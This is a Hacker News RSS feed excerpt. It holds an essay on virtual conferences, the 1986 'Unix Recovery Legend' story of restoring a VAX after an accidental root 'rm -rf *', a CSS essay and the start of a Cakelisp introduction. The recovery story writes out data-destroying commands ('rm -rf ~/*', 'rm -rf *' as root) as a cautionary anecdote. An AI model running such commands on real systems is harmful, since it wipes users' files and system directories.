<p>One of the whitest-ass things in the world is our peopleâ€™s obsession with songs at sporting events, and indeed, in large crowds. If youâ€™re reading this and youâ€™re from Europe, feel free to replace my references to Sweet Caroline with Seven Nation Army, same diff. That said, you can fairly reliably trigger this behavior in most cultures in most parts of the world by finding a sufficiently rowdy bar around midnight and playing <em>something</em> on the jukebox that gets folks going. Humans, weâ€™re social creatures, yeah? A few bars of Neil Diamond, a couple people singing along, and by the time youâ€™re at â€˜Hands, touching handsâ€™ youâ€™ll have a swelling crescendo that culminates in a ear-shattering and atonal screech of â€˜SWEEEEEEEEEEEEET CAR-O-LINE (WOAH OH OH)â€™ making the bartenders silently plot the murder of everyone in their line of sight.</p>
<p>People like being around people, and most people donâ€™t treat everyone around them as some sort of incredibly delicate faberge egg. Thereâ€™s a lot of â€œwow look at all these accomodations people are making that disabled people have asked for now that nobody is supposed to leave their house! hypocrisy, much??â€ and Iâ€™m like, yeah, duh? Pointing out hypocrisy is the lowest form of engagement in 2020. This is why virtual events suck â€“ because nobody is actually planning on doing them any longer than they need to.</p>

<blockquote>
<p>One of the benefits of in-person conferences is that they temporarily remove you from your day-to-day work and immerse you in a community of like-minded individuals. Itâ€™s not just about getting to hear new ideas, but also about the break from your daily routine. This is one of the things that is hardest to replicate in a virtual event. DIDevOps was perhaps the most successful virtual conference Iâ€™ve seen in making their event feel like An Event. This event was clever and whimsical, the community was engaged, and it definitely didnâ€™t feel like just another video call.</p>
</blockquote>
<p><a href="https://redmonk.com/rstephens/2020/04/30/deserted-island-devops/">Rachel Stephens, RedMonk</a></p>
<p>I wrote earlier this year about the idea of a <a href="https://aparker.io/posts/deserted-island-devops/">decisive moment</a> and how that influenced the thinking behind Deserted Island DevOps. To elaborate a bit, Cartier-Bresson was a street photographer who coined this phrase in the introduction to his 1947 book.</p>
<blockquote>
<p>Photography is the simultaneous recognition, in a fraction of a second, of the significance of an event as well as of a precise organisation of forms which give that event its proper expression.</p>
</blockquote>
<p>What is, then, the â€˜decisive momentâ€™ of a tech conference? My original criteria was that an event was <em>etherial</em> or placeless; From the smallest DevOpsDays to the largest re:Invent, an event is defined less by the where than by the who. As an attendee, you are swept away from the status quo for a time (even as it inorexably pulls you back in, given the amount of people I see working on laptops during events) into a convention center or hotel or theater or whatever, specifically to focus on something other than what you normally would. Quite literally, you are being moved out of your comfort zone. This can prime you to accept ideas that normally you wouldnâ€™t, can rejigger your brain chemistry for a few hours to make you see things from a different perspective. Thatâ€™s valuable! As a speaker, youâ€™re transported to a new stage, with a new audience, a new set of eyes and ears to reflect off of. Itâ€™s almost like being a comedian and testing out material â€“ you try some new lines, some new jokes, add an anecdote here, shave one off there. Repetition builds mastery. Next week, or next month, youâ€™re going to do it all again. Our traversal through the liminal spaces between these potemkin stages lends itself to inward focus where we must Do The Work to shut out the world around us. To be less floral about it, the demands of the road make us better speakers because the only way we donâ€™t go fuckinâ€™ mad is to focus on the work.</p>
<p>Virtual events offer none of this, unfortunately. As attendees, another Slack, another Zoom call, another wave of talking heads and PowerPoint. As speakers, our audience disappears behind a chat window. We lose our reflection. Itâ€™s sad and terrible and great for some people, but on the balance I think we dislike it more than we like it.</p>
<p>The bad is part of the fun! You canâ€™t replicate the feeling of gnawing on an underripe banana while chugging overly-hot-but-not-terribly-flavorful coffee watching someone whoâ€™s company paid way too much for a keynote while mentally ticking off the people you need to talk to that day while working out the soreness in your back from the bed that isnâ€™t yours that you got maybe four productive sleeping hours in due to jet lag while figuring out who youâ€™re going to catch up with after the show wraps that day as you muse about how it looks like your competitors have a much nicer booth than yours, and you wonder if theyâ€™re hiring except that one asshole still works there and so on and so forth. â€œThat sounds terrible!â€ you may be musing, <em>and youâ€™d be right</em>, but I love the terrible. I thrive in the terrible. Iâ€™m drinking single origin fair trade coffee beans that were roasted in small batches locally brewed in a fancy coffee maker and I can tell you that when this is all over and I can have a cuppa brewed in the backroom of a Hilton it is going to be the sweetest thing I can possibly imagine for five seconds right before I start hating everything about it again and <em>thatâ€™s fine</em>.</p>
<p>The bad of an in-person event is terrible, but itâ€™s a terrible I can work with. I go outside like once or twice a week now to get groceries and thatâ€™s all Iâ€™ve done for the past nine months. <em>I want the workable terrible, not this horrific stasis</em>.</p>

<p>The reason that virtual events suck is that weâ€™re trying to replicate in-person events. Weâ€™re doing old-school iOS skeumorphism but for primarily social gatherings. No wonder they suck! Thereâ€™s a few broad reasons:</p>
<ul>
<li><em>Bad UX</em>: Sometimes I like to style on babies by displaying object permanance, but you wouldnâ€™t know that given the utter contempt event platforms seem to have for their audiences by doing dumb skeumorphic â€œconference hallsâ€ with badly â€˜shopped people standing around.</li>
</ul>
<p><img src="https://aparker.io/images/kubeconlobby.png" alt="KubeCon EU â€˜Lobbyâ€™"></p>
<ul>
<li>
<p><em>Pervasive Surveillence</em>: I use ad blockers but a bunch of people donâ€™t, on principle though itâ€™s really fuckinâ€™ creepy that every click you make on one of these event platforms is tracked. Simply navigating to a sponsor booth counts as a â€˜leadâ€™ to the sponsor. Yikes!</p>
</li>
<li>
<p><em>Poor AV Quality</em>: I get that people have to record from their homes but maybe recording someoneâ€™s Zoom isnâ€™t the best way to do this? Iâ€™m sympathetic, this is legit a hard problem to solve, but many large conferences are still charging an arm and a leg to sponsors (and less for attendees but thatâ€™s a different point) so how about you do local recording then edit things later? If youâ€™re going to charge me at <em>all</em> then I expect the production values to at least beat out a random Twitch streamer.</p>
</li>
<li>
<p><em>Poor Viewing Experience</em>: A tiny pop-out 720p video that artifacts when I change the size isâ€¦ not great. Integrate chat and Q&amp;A better. Do <em>something</em> unique with the format. I sit on enough Zoom calls. Like, why would I <em>pay money</em> to <em>watch videos</em> with a <em>worse player than YouTube</em>? Thereâ€™s millions of hours of shit out there for free!</p>
</li>
<li>
<p><em>Yet Another Slack</em>: I just donâ€™t want to join more Slack channels where people are randomly @hereâ€™ing and I never know if itâ€™s an event organizer with an announcement or some salesperson trying to coax people into their virtual booth.</p>
</li>
<li>
<p><em>Did I Mention Virtual Booths Yet</em>: I have never interacted with anyone in a Virtual Booth and I never will. This appears to be a common sentiment.</p>
</li>
</ul>

<p>Alright, letâ€™s flip the script. Iâ€™m wearing my business hat now.</p>
<ul>
<li>
<p><em>Bad UX</em>: You think the <em>attendee</em> experience is bad, the admin/sponsor controls and views on these platforms is worse. Arbitrary requirements, poor control over look and feel, nah fam miss me with this.</p>
</li>
<li>
<p><em>Poor Interactivity</em>: You know whatâ€™s great about a real booth? People wander by and they get interested. Why do they wander by? Because theyâ€™re not at home, they need to kill time, and the snacks are on the trade floor. Maybe they just want a t-shirt or whatever, fine, but we do actually get a lot of really valuable feedback and eyes on the product by doing demos. This is extremely useful, and it simply doesnâ€™t happen at virtual events.</p>
</li>
<li>
<p><em>Attendee Impedence Mismatch</em>: This is more of a theory but I suspect that the attendee mix for virtual events in terms of titles is significantly out-of-balance compared to in-person events. One popular (<em>n</em> = ~1300) virtual event this year had self-reported attendance of only 4% for management roles, but over 40% IC (developer/devops/ops) roles. My hypothesis is that â€œdecision makersâ€ are less likely to attend virtual events because theyâ€™re intensely overbooked during the in-person -&gt; distributed team transition period and are oversubscribed on other things, which translates into less useful direct sales conversations, but I could be off-base here. If nothing else, my anecdata from talking about this seems to indicate that attendees just donâ€™t really go to virtual booths.</p>
</li>
<li>
<p><em>Success Looks Different</em>: This is one of those â€˜two-way streetâ€™ problems, but I donâ€™t think organizers did a great job in general making sponsors successful, and I donâ€™t think sponsors had the muscle to make themselves successful in a lot of ways. Trying to be too different caused a lot of friction, however, and during a time of reinvention this friction reduced experimentation in my opinion.</p>
</li>
</ul>

<p>Last part - the speaker experience.</p>
<ul>
<li>
<p><em>My Home Is Not Your Home</em>: One of the low key worst things about the pandemic has been the idea of us â€˜opening up our homesâ€™ and letting people see how we live. Could we fuckinâ€™ not? Like I donâ€™t believe that I even have to discuss this but we should probably put the Room Rater person on trial for crimes against humanity. I donâ€™t <em>want</em> to have to be super concious about my webcam or audio or whatever, I donâ€™t <em>want</em> to â€¦</p></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aparker.io/posts/virtual-events-suck/">https://aparker.io/posts/virtual-events-suck/</a></em></p>]]>
            </description>
            <link>https://aparker.io/posts/virtual-events-suck/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491847</guid>
            <pubDate>Mon, 21 Dec 2020 03:21:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unix Recovery Legend (1986)]]>
            </title>
            <description>
<![CDATA[
Score 166 | Comments 97 (<a href="https://news.ycombinator.com/item?id=25491790">thread link</a>) | @signa11
<br/>
December 20, 2020 | https://www.ee.ryerson.ca/~elf/hack/recovery.html | <a href="https://web.archive.org/web/*/https://www.ee.ryerson.ca/~elf/hack/recovery.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<h4>This classic article from Mario Wolczko first
appeared on Usenet in 1986.  </h4>

Have you ever left your terminal logged in, only to find when you
came back to it that a (supposed) friend had typed "<kbd>rm -rf
~/*</kbd>" and was hovering over the keyboard with threats along the
lines of "<em>lend me a fiver 'til Thursday, or I hit return</em>"?
Undoubtedly the person in question would not have had the nerve to
inflict such a trauma upon you, and was doing it in jest.  So you've
probably never experienced the worst of such disasters....<p>


It was a quiet Wednesday afternoon.  Wednesday, 1st October, 15:15
BST, to be precise, when Peter, an office-mate of mine, leaned away
from his terminal and said to me, "<em>Mario, I'm having a little
trouble sending mail.</em>" Knowing that msg was capable of confusing
even the most capable of people, I sauntered over to his terminal to
see what was wrong.  A strange error message of the form (I forget
the exact details) "<kbd>cannot access /foo/bar for userid 147</kbd>"
had been issued by msg.  My first thought was "<em>Who's userid 147?;
the sender of the message, the destination, or what?</em>" So I leant
over to another terminal, already logged in, and typed</p><blockquote>        <kbd>grep 147 /etc/passwd</kbd></blockquote>

<p>only to receive the response</p><blockquote>        <kbd>/etc/passwd: No such file or directory.</kbd></blockquote>

Instantly, I guessed that something was amiss.  This was confirmed
when in response to<blockquote>        <kbd>ls /etc</kbd></blockquote>

<p>I got</p><blockquote>        <kbd>ls: not found.</kbd></blockquote>

I suggested to Peter that it would be a good idea not to try anything
for a while, and went off to find our system manager.<p>

When I arrived at his office, his door was ajar, and within ten
seconds I realised what the problem was.  James, our manager, was
sat down, head in hands, hands between knees, as one whose world has
just come to an end.  Our newly-appointed system programmer, Neil, was
beside him, gazing listlessly at the screen of his terminal.  And at
the top of the screen I spied the following lines:</p><blockquote>
        <kbd># cd <br>
        # rm -rf *</kbd>
</blockquote>

<p>Oh, shit, I thought.  That would just about explain it.</p><p>


I can't remember what happened in the succeeding minutes; my memory
is just a blur.  I do remember trying <kbd>ls</kbd> (again),
<kbd>ps</kbd>, <kbd>who</kbd> and maybe a few other commands beside,
all to no avail.  The next thing I remember was being at my terminal
again (a multi-window graphics terminal), and typing</p><blockquote>
        <kbd>cd /<br>
        echo *</kbd>
</blockquote>
<p>I owe a debt of thanks to David Korn for making <kbd>echo</kbd> a
built-in of his shell; needless to say, <kbd>/bin</kbd>, together
with <kbd>/bin/echo</kbd>, had been deleted.  What transpired in the
next few minutes was that <kbd>/dev</kbd>, <kbd>/etc</kbd> and
<kbd>/lib</kbd> had also gone in their entirety; fortunately Neil had
interrupted <kbd>rm</kbd> while it was somewhere down below
<kbd>/news</kbd>, and <kbd>/tmp</kbd>, <kbd>/usr</kbd> and
<kbd>/users</kbd> were all untouched.</p><p>


Meanwhile James had made for our tape cupboard and had retrieved what
claimed to be a dump tape of the root filesystem, taken four weeks
earlier.  The pressing question was, "<em>How do we recover the
contents of the tape?</em>".  Not only had we lost
<kbd>/etc/restore</kbd>, but all of the device entries for the tape
deck had vanished.  And where does <kbd>mknod</kbd> live?  You
guessed it, <kbd>/etc</kbd>.  How about recovery across Ethernet of
any of this from another VAX?  Well, <kbd>/bin/tar</kbd> had gone,
and thoughtfully the Berkeley people had put <kbd>rcp</kbd> in
<kbd>/bin</kbd> in the 4.3 distribution.  What's more, none of the
Ether stuff wanted to know without <kbd>/etc/hosts</kbd> at least.
We found a version of <kbd>cpio</kbd> in <kbd>/usr/local</kbd>, but
that was unlikely to do us any good without a tape deck.</p><p>


Alternatively, we could get the boot tape out and rebuild the root
filesystem, but neither James nor Neil had done that before, and we
weren't sure that the first thing to happen would be that the whole
disk would be re-formatted, losing all our user files.  (We take dumps
of the user files every Thursday; by Murphy's Law this had to happen
on a Wednesday).  Another solution might be to borrow a disk from
another VAX, boot off that, and tidy up later, but that would have
entailed calling the DEC engineer out, at the very least.  We had a
number of users in the final throes of writing up PhD theses and the
loss of a maybe a weeks' work (not to mention the machine down time)
was unthinkable.</p><p>


So, what to do?  The next idea was to write a program to make a
device descriptor for the tape deck, but we all know where
<kbd>cc</kbd>, <kbd>as</kbd> and <kbd>ld</kbd> live.  Or maybe make
skeletal entries for <kbd>/etc/passwd</kbd>, <kbd>/etc/hosts</kbd>
and so on, so that <kbd>/usr/bin/ftp</kbd> would work.  By sheer
luck, I had a <kbd>gnuemacs</kbd> still running in one of my windows,
which we could use to create <kbd>passwd</kbd>, etc., but the first
step was to create a directory to put them in.  Of course
<kbd>/bin/mkdir</kbd> had gone, and so had <kbd>/bin/mv</kbd>, so we
couldn't rename <kbd>/tmp</kbd> to <kbd>/etc</kbd>.  However, this
looked like a reasonable line of attack.</p><p>


By now we had been joined by Alasdair, our resident UNIX guru, and as
luck would have it, someone who knows VAX assembler.  So our plan
became this: write a program in assembler which would either rename
<kbd>/tmp</kbd> to <kbd>/etc</kbd>, or make <kbd>/etc</kbd>, assemble
it on another VAX, <kbd>uuencode</kbd> it, type in the uuencoded file
using my gnu, <kbd>uudecode</kbd> it (some bright spark had thought
to put <kbd>uudecode</kbd> in <kbd>/usr/bin</kbd>), run it, and hey
presto, it would all be plain sailing from there.  By yet another
miracle of good fortune, the terminal from which the damage had been
done was still <kbd>su</kbd>'d to root (<kbd>su</kbd> is in
<kbd>/bin</kbd>, remember?), so at least we stood a chance of all
this working.</p><p>


Off we set on our merry way, and within only an hour we had managed
to concoct the dozen or so lines of assembler to create
<kbd>/etc</kbd>.  The stripped binary was only 76 bytes long, so we
converted it to hex (slightly more readable than the output of
<kbd>uuencode</kbd>), and typed it in using my editor.  If any of you
ever have the same problem, here's the hex for future reference:</p><blockquote>
   <kbd>070100002c000000000000000000000000000000000000000000000000000000<br>
        0000dd8fff010000dd8f27000000fb02ef07000000fb01ef070000000000bc8f<br>
		8800040000bc012f65746300</kbd>
</blockquote>

<p>

I had a handy program around (doesn't everybody?) for converting
ASCII hex to binary, and the output of <kbd>/usr/bin/sum</kbd>
tallied with our original binary.  But hang on---how do you set
execute permission without <kbd>/bin/chmod</kbd>?  A few seconds
thought (which as usual, lasted a couple of minutes) suggested that
we write the binary on top of an already existing binary, owned by
me...problem solved.

So along we trotted to the terminal with the root login, carefully
remembered to set the umask to 0 (so that I could create files in it
using my gnu), and ran the binary.  So now we had a <kbd>/etc</kbd>,
writable by all.  From there it was but a few easy steps to creating
<kbd>passwd</kbd>, <kbd>hosts</kbd>, <kbd>services</kbd>,
<kbd>protocols</kbd>, (etc), and then <kbd>ftp</kbd> was willing to
play ball.  Then we recovered the contents of <kbd>/bin</kbd> across
the ether (it's amazing how much you come to miss <kbd>ls</kbd> after
just a few, short hours), and selected files from <kbd>/etc</kbd>.
The key file was <kbd>/etc/rrestore</kbd>, with which we recovered
<kbd>/dev</kbd> from the dump tape, and the rest is history.</p><p>


Now, you're asking yourself (as I am), what's the moral of this
story?  Well, for one thing, you must always remember the immortal
words, <strong>DON'T PANIC</strong>.  Our initial reaction was to
reboot the machine and try everything as single user, but it's
unlikely it would have come up without <kbd>/etc/init</kbd> and
<kbd>/bin/sh</kbd>.  Rational thought saved us from this one.</p><p>


The next thing to remember is that UNIX tools really can be put to
unusual purposes.  Even without my <kbd>gnuemacs</kbd>, we could have
survived by using, say, <kbd>/usr/bin/grep</kbd> as a substitute for
<kbd>/bin/cat</kbd>.</p><p>


And the final thing is, it's amazing how much of the system you can
delete without it falling apart completely.  Apart from the fact that
nobody could login (<kbd>/bin/login</kbd>?), and most of the useful
commands had gone, everything else seemed normal.  Of course, some
things can't stand life without say <kbd>/etc/termcap</kbd>, or
<kbd>/dev/kmem</kbd>, or <kbd>/etc/utmp</kbd>, but by and large it
all hangs together.</p><p>


I shall leave you with this question: if you were placed in the same
situation, and had the presence of mind that always comes with
hindsight, could you have got out of it in a simpler or easier way?
Answers on a postage stamp to:</p><pre>Mario Wolczko
------------------------------------------------------------------------
Dept. of Computer Science       ARPA:   miw%uk.ac.man.cs.ux@cs.ucl.ac.uk
The University                  USENET: mcvax!ukc!man.cs.ux!miw
Manchester M13 9PL              JANET:  miw@uk.ac.man.cs.ux
U.K.                            061-273 7121 x 5699
------------------------------------------------------------------------
</pre>

<hr>

<address><a href="https://www.ee.ryerson.ca/~elf/hack/index.html">Hacker's Wisdom</a>: Unix Recovery
Legend</address>

<!-- hhmts start -->
Last modified: Thu Mar  7 13:47:40 EST 1996
<!-- hhmts end --></div>]]>
            </description>
            <link>https://www.ee.ryerson.ca/~elf/hack/recovery.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491790</guid>
            <pubDate>Mon, 21 Dec 2020 03:11:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Makes CSS Hard to Master]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25491789">thread link</a>) | @gmays
<br/>
December 20, 2020 | https://timseverien.com/posts/2020-12-06-what-makes-css-hard-to-master/ | <a href="https://web.archive.org/web/*/https://timseverien.com/posts/2020-12-06-what-makes-css-hard-to-master/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last week, <a href="https://twitter.com/EmmaBostian/status/1334435314673348609">Emma Bostian tweeted about how she was sick of â€œ[CSS]â€™s shit.â€</a> <a href="https://twitter.com/EmmaBostian/status/1334863522749145096">She later apologised</a>, but her wording suggests she still thinks it isnâ€™t lack of knowledge. Itâ€™s fairly common for software engineers to complain about CSS. Interestingly enough, that portion of the web development community also thinks CSS is easy.</p>
<p>In contrast, <a href="https://twitter.com/meyerweb/status/1334862797822373889">Eric Meyer</a>, <a href="https://twitter.com/SaraSoueidan/status/1334796914831855617">Sara Soueidan</a>, <a href="https://twitter.com/brucel/status/1334818455275626499">Bruce Lawson</a>, and more (principal) web developers seem to agree that CSS is hard to master. Itâ€™s interesting how experts say CSS is hard, while a group of people who specialise in other technology say otherwise.</p>
<p>I feel we, the community, have to acknowledge that CSS is easy to get started with and hard to master. Letâ€™s reflect on the language and find out what makes it hard.</p>
<h2 id="syntax-and-common-properties"><a href="#syntax-and-common-properties">#</a> Syntax And Common Properties</h2>
<p>Back in 2013, Hugo â€œKittyâ€ Giraudel published <a href="https://hugogiraudel.com/2013/04/15/css-is-easy/">CSS is Easy</a>, in which they also write about how CSS is perceived as easy. In the article, Kitty makes an excellent point: â€œCSS is easyâ€¦ syntactically.â€ I wholeheartedly agree. Consider the following example:</p>
<pre><code><span>body</span> {
  <span>background-color</span>: black;
  <span>color</span>: white;
}

<span>@media</span> (<span>min-width:</span> <span>64em</span>) {
  <span>body</span> {
    <span>background-color</span>: white;
    <span>color</span>: black;
  }
}
</code></pre>
<p>In this snippet, you can see much of the syntax used in CSS. There are selectors, declarations, I even added an at-rule (<code>@media</code>). The properties and values in this example are straight-forward; they just work. The at-rule, although syntactically simple, adds some cognitive load to understanding this snippet. It creates a relationship between whatâ€™s inside and outside the at-rule. In other words, to determine what colour the <code>body</code> is, we have to parse the entire file mentally.</p>
<p>This snippet isnâ€™t too complex, but as we get more code the number of relationships (like the at-rule) do too.</p>
<h2 id="a-web-of-relationships"><a href="#a-web-of-relationships">#</a> A Web Of Relationships</h2>
<p>Syntax and basic properties are pretty easy, indeed. However, the learning curve of CSS quickly gets steeper when you start dealing with various relationships. Letâ€™s look at some.</p>
<h3 id="property-sets"><a href="#property-sets">#</a> Property Sets</h3>
<p>Many properties are part of a set, meaning you may need several others to make one work. For instance, the <code>left</code>, <code>right</code>, <code>top</code>, <code>bottom</code>, and the <code>z-index</code> properties are ignored until you add the <code>position</code> property and set it to anything but <code>static</code>. That means that you have to learn a couple of properties of a set and how they relate to each other before being able to use one. If youâ€™re unaware which properties rely on others, it can be extremely frustrating because it may appear that a declaration just doesnâ€™t work.</p>
<p>Additionally, itâ€™s not always obvious which pieces of the set are declared. Consider the following example:</p>
<pre><code><span>.snackbar</span> {
  <span>position</span>: fixed;
  <span>bottom</span>: <span>1rem</span>;
  <span>left</span>: <span>1rem</span>;
  <span>right</span>: <span>1rem</span>;
}

<span>@media</span> (<span>min-width:</span> <span>64em</span>) {
  <span>.snackbar</span> {
    <span>bottom</span>: <span>2rem</span>;
    <span>left</span>: <span>2rem</span>;
    <span>right</span>: <span>2rem</span>;
  }
}
</code></pre>
<p>If we look at the first rule, we can easily tell how an element with the <code>snackbar</code> class would be positioned on our page. If we look at the second rule, the one in the <code>@media</code> at-rule, weâ€™re not so sure. Weâ€™d have to look up the <code>.snackbar</code> rule outside the at-rule. This example is fairly obvious, but it can get pretty obscure. The <code>position: fixed</code> declaration could be set elsewhere, on another selector, or inline.</p>
<h3 id="the-dom"><a href="#the-dom">#</a> The <abbr title="Document Object Model">DOM</abbr></h3>
<p>We canâ€™t determine which styles are applied just by looking at your CSS. The HTML, or rather the DOM, also affects them. We have to consider the tag name of the element, its attributes, its siblings, its parents all the way up to the root node, and all relevant styles. If you render HTML server- or client-side, all of this may be dynamic and influenced by the application state.</p>
<p>The adjacent sibling combinator (<code>+</code>) is a simple example of how HTML influences CSS. The following style is only applied when a <code>li</code> is followed by another:</p>
<pre><code><span>li</span> + <span>li</span> { <span>margin-top</span>: <span>1rem</span>; }
</code></pre>
<p>This example is quite expressive but doesnâ€™t have to be. Another example that took me a while to get as a beginner was using <code>position: absolute</code> on an element with a parent with <code>position: relative</code>. The element with <code>position: absolute</code> is positioned relative to the viewport or relative to an ancestor element with <code>position: relative</code>. In order to place this <code>absolute</code> element correctly in the interface, we have to know whether the element sits in a container with <code>position: relative</code>. Again, weâ€™d have to look at the DOM, and at all itâ€™s states, to be sure this is the case.</p>
<p>A similar, perhaps more familiar, example is the <code>flex</code> property. It only works if the element is a direct child of an element with the <code>display: flex</code> declaration.</p>
<p>When we write CSS, we always have to consider the DOM.</p>
<h3 id="cascade"><a href="#cascade">#</a> Cascade</h3>
<p>Letâ€™s say I want text and links in the <code>&lt;nav&gt;</code> element to be red. We might write the following CSS:</p>
<pre><code><span>nav</span> { <span>color</span>: red; }
<span>nav</span> <span>a</span> { <span>color</span>: inherit; }
</code></pre>
<p>These two simple declarations imply various relationships. The link colour is now dependent on the colour of the text. Because of that, we can set the text colour of the <code>&lt;nav&gt;</code> element and the link will inherit this colour. If we remove either of these two declarations, the link colour wonâ€™t be red anymore.</p>
<p>The flexibility cascade gives has its benefits, but itâ€™s not hard to imagine that it can get difficult to track the relationships between all styles. Itâ€™s no surprise that many opt to use cascade as little as possible.</p>
<h2 id="compatibility"><a href="#compatibility">#</a> Compatibility</h2>
<p>Designing an interface with CSS that doesnâ€™t break is no easy task. There are numerous devices, browsers, resolutions, and users we have to take into account. We can also account for device settings, like dark mode using <code>prefers-color-scheme: dark/light</code>. On top of that, there are often various conditions in the interface that affect the styling as well.</p>
<p>Every combination of all these states and overrides have to be taken into account to produce the right output style. Again, this is no easy feat. It often involves a lot of tools and testing during and after development.</p>
<h2 id="maintainability"><a href="#maintainability">#</a> Maintainability</h2>
<p>Like all other code, CSS should be clean, readable, and maintainable. We can group styles into various files, or prefix selectors, but all rules live globally. This is a challenge, but also greatly contributes to keeping the code <abbr title="Donâ€™t Repeat Yourself">DRY</abbr>.</p>
<p>I earlier explained various types of relationships in CSS. They play a part in maintainability as well. Some of the methodologies used in CSS â€” like atomic design, <abbr title="Block Element Modifier">BEM</abbr>, <abbr title="Inverted Triangle CSS">ITCSS</abbr>, and others â€” help to keep the coupling in check. Theyâ€™re similar to paradigms and best practises in programming, and also steepen the learning curve and requires additional knowledge.</p>
<p>Then there are also preprocessors. We have a lot of them (e.g. PostCSS, Sass, LESS, and Stylus) at our disposal to do things we canâ€™t do with vanilla CSS. This usually improves maintainability but does add another layer of complexity.</p>
<p>Finally, not unlike other languages, there often are various solutions to one problem. A common example is deciding between <code>display: inline-block</code>, the <code>float</code> property, flexbox, or grid to horizontally stack a list of items. Each has its pros and cons. When mentoring beginners, I found this is a challenge for them. Itâ€™s also difficult to convey the differences of these options â€” that are often subtle â€” and which is the most robust in a given situation.</p>
<p>All together, maintainability in CSS is a tradeoff. The code gets more complex syntactically and bound by self-imposed rules, but (hopefully) reduces the effort it takes to understand and modify the code.</p>
<h2 id="concluding"><a href="#concluding">#</a> Concluding</h2>
<p>CSS may seem simple at first, but the learning curve isnâ€™t linear; mastering it is hard. By no means is the language perfect, but itâ€™s amazingly efficient at what itâ€™s designed to do. Despite its simple syntax, thereâ€™s little it canâ€™t do.</p>
<p>I think mastering CSS comes down to having a good amount of knowledge about it, recognising the subtle dependencies between different declarations, rules, and the DOM, understanding how they make your CSS complex, and how to best avoid them. Reaching that point is naturally frustrating because you will run into code that is a tangled mess where the tiniest edit might change the interface in unexpected ways.</p>
<p>I worry that the way we think about CSS might affect how beginners perceive the language. If they are taught that CSS is easy, they might be discouraged from seeking help when they struggle or just blame the language. Admitting you struggle with something is difficult enough. Letâ€™s not make it worse for them.</p>
<p>I feel itâ€™s better if we acknowledge the complexity of writing CSS. We might also stop looking down on CSS specialists. Today, theyâ€™re often considered half a developer, whilst (JavaScript) software engineers (or UI engineers, or whatever theyâ€™re called nowadays) that know little about the complexities of CSS are considered full-fledged front-end developers. We see this on social media, in job openings, and in pay.</p>
<p>Thanks to Danielle, Hidde, Sven, and Thijs for reviewing this post.</p>
</div></div>]]>
            </description>
            <link>https://timseverien.com/posts/2020-12-06-what-makes-css-hard-to-master/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491789</guid>
            <pubDate>Mon, 21 Dec 2020 03:11:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Russian Covid vaccine scientist dead w stab wounds after falling from 14th floor]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25491576">thread link</a>) | @bookofjoe
<br/>
December 20, 2020 | https://www.thesun.ie/news/6309990/russian-scientist-covid-vaccine-dead-stab-wounds/ | <a href="https://web.archive.org/web/*/https://www.thesun.ie/news/6309990/russian-scientist-covid-vaccine-dead-stab-wounds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.thesun.ie/news/6309990/russian-scientist-covid-vaccine-dead-stab-wounds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25491576</guid>
            <pubDate>Mon, 21 Dec 2020 02:30:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cakelisp: A Programming Language for Games]]>
            </title>
            <description>
<![CDATA[
Score 177 | Comments 63 (<a href="https://news.ycombinator.com/item?id=25491568">thread link</a>) | @makuto
<br/>
December 20, 2020 | https://macoy.me/blog/programming/CakelispIntro | <a href="https://web.archive.org/web/*/https://macoy.me/blog/programming/CakelispIntro">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><em>Update:</em> See the <a href="https://news.ycombinator.com/item?id=25491568">Hacker News thread</a>, <a href="https://www.reddit.com/r/programming/comments/kh6ox0/cakelisp_a_programming_language_for_games/">/r/programming</a>, <a href="https://www.reddit.com/r/ProgrammingLanguages/comments/kh6gh2/cakelisp_a_programming_language_for_games/">/r/ProgrammingLanguages</a>, and <a href="https://www.reddit.com/r/gamedev/comments/kh1p0a/cakelisp_a_programming_language_for_games/">/r/gamedev</a> posts for discussions on this article and Cakelisp.</p>
<p>I have been working on a new programming language since the end of August 2020. It is hosted on <a href="https://github.com/makuto/cakelisp/">Github</a>, and mirrored on <a href="https://macoy.me/code/macoy/cakelisp/">my site</a>.</p>
<p>If you want to see a working example first, <a href="https://macoy.me/code/macoy/gamelib/src/branch/master/test/src/VocalGame.cake">VocalGame.cake</a> is a simple audio looper with Ogre 3D graphics and SDL for windowing, input, and audio. This demo supports code hot-reloading and doesn't require an external build system, only Cakelisp. You can also check <a href="https://macoy.me/code/macoy/cakelisp/src/branch/master/runtime/Macros.cake">Macros.cake</a>, which demonstrates some use-cases for compile-time code.</p>
<p>I figured showing non-trivial examples would be much more interesting. It also proves that Cakelisp is working.</p>

<p>Cakelisp is built for me first, but it should appeal to fellow programmers who know what they're doing and want to try a more powerful language.</p>
<p>Cakelisp might be for you if you wantâ€¦</p>
<ul>
<li><strong>Uncompromised performance</strong></li>
<li><strong>Trust in you, the programmer</strong></li>
<li><strong>Powerful code generation</strong></li>
</ul>
<p>If any of the things in that list don't make sense to you, or you think you're already getting them in language <em>X</em>, then Cakelisp isn't for you, and that's okay! We have different domains and different problems, so it makes some sense to use different languages and methodologies.</p>
<p>While many languages have these features, few have the combination of all three. Lisp has extremely powerful code generation, but makes serious performance compromises. C is great for performance but can require extremely repetitive code writing to accomplish tasks a simple code generator could handle. Rust is fast (well, apart from compilation, which is very important for iterative development to be productive), but doesn't trust the programmer.</p>

<p>My goal is to "have my cake and eat it too", meaning all three of these features in one coherent package. Importantly, there isn't one dominating principle in Cakelisp (no <a href="https://www.youtube.com/watch?v=TH9VCN6UkyQ">Big Idea</a>). I've found that the small things like removing the need for header files, no longer dealing with external build systems, or being able to run Cakelisp files like scripts, end up making a big difference when combined in one package.</p>
